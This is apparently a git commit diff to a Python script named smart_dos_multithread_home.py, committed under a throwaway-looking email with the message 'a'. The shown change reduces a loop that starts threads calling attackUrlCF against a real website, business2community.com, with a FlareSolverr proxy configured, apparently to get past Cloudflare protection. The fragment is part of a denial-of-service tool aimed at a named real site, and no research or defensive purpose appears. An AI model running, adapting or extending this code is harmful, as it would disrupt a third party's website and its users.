f128cbc90e8657b01ed1d0b546ddc362f347cfcd
blabla <heyholetsgo4@protonmail.com>
2023-01-24 19:40:35 +0200

    'a'

--- smart_dos_multithread_home.py
+++ smart_dos_multithread_home.py
@@ -134,7 +134,7 @@ def attackAll():
 
 flareSolverUrl = 'http://localhost:8191/v1'
 
-for i in range(10):
+for i in range(1):
 	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
 	time.sleep(30)
 input()
